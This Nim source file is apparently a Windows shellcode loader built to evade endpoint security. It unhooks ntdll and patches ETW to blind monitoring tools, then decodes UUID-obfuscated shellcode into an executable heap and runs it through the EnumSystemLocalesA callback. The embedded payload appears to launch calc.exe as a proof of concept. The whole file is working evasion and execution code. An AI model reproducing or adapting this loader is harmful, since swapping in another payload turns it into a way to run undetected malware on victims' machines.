import winim
import strutils
import strformat
import ../supports/etw_patch
import ../supports/ntdll_unhook

var uuidArray = allocCStringArray([
  "E48348FC-E8F0-00C0-0000-415141505251",
  "D2314856-4865-528B-6048-8B5218488B52",
  "728B4820-4850-B70F-4A4A-4D31C94831C0",
  "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
  "48514152-528B-8B20-423C-4801D08B8088",
  "48000000-C085-6774-4801-D0508B481844",
  "4920408B-D001-56E3-48FF-C9418B348848",
  "314DD601-48C9-C031-AC41-C1C90D4101C1",
  "F175E038-034C-244C-0845-39D175D85844",
  "4924408B-D001-4166-8B0C-48448B401C49",
  "8B41D001-8804-0148-D041-5841585E595A",
  "59415841-5A41-8348-EC20-4152FFE05841",
  "8B485A59-E912-FF57-FFFF-5D48BA010000",
  "00000000-4800-8D8D-0101-000041BA318B",
  "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
  "C48348D5-3C28-7C06-0A80-FBE07505BB47",
  "6A6F7213-5900-8941-DAFF-D563616C632E",
  "00657865-9090-9090-9090-909090909090",
])
var uuidCount: int = 18

when isMainModule:
  var result_ntdll = ntdllunhook()
  var result_etw = Patchntdll()
  if result_ntdll and result_etw:
    echo fmt"[*] Allocating Heap Memory"
    let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    let ha = HeapAlloc(hHeap, 0, 0x100000)
    var hptr = cast[DWORD_PTR](ha)
    if hptr != 0:
        echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
    else:
        echo fmt"[-] Heap Alloc Error "
        quit(QuitFailure)

    for i in 0..(uuidCount-1):
        var status = UuidFromStringA(cast[RPC_CSTR](uuidArray[i]), cast[ptr UUID](hptr))
        if status != RPC_S_OK:
            if status == RPC_S_INVALID_STRING_UUID:
                echo fmt"[-] Invalid UUID String Detected"
            else:
                echo fmt"[-] Something Went Wrong, Error Code: {status}"
            quit(QuitFailure)
        hptr += 16
    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
    CloseHandle(hHeap)
    quit(QuitSuccess)
  else:
    echo fmt"[-] Something went wrong..."
    quit(QuitFailure)
